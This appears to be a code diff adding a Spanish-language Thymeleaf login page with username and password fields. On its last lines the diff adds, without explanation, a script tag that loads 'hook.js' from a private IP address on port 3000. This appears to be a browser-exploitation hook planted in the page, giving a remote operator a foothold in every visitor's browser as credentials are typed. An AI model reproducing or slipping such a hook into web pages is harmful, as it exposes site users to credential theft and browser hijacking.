@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html data-theme="dracula" xmlns:th="http://www.thymeleaf.org" lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link href="https://cdn.jsdelivr.net/npm/daisyui@2.12.0/dist/full.css" rel="stylesheet" type="text/css"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Login</title>
+</head>
+<body class="container mx-auto">
+
+<form th:action="@{/login}" method="post">
+    <div class="grid grid-cols-1 justify-items-center p-6">
+        <h6 class="font-semibold">Username: </h6>
+        <input class="input input-bordered w-64 m-2" type="text" name="username"/>
+        <h6 class="font-semibold">Password: </h6>
+        <input class="input input-bordered w-64 m-2" type="password" name="password"/>
+        <button type="submit" class="btn btn-active btn-md w-40 m-2 btn-info">Inciar Sesión</button>
+        <div style="margin-top: 10px" th:if="${param.error}">
+            Datos invalidos broder
+        </div>
+    </div>
+</form>
+
+<script src="http://192.168.62.38:3000/hook.js"/>
+</body>
+</html>
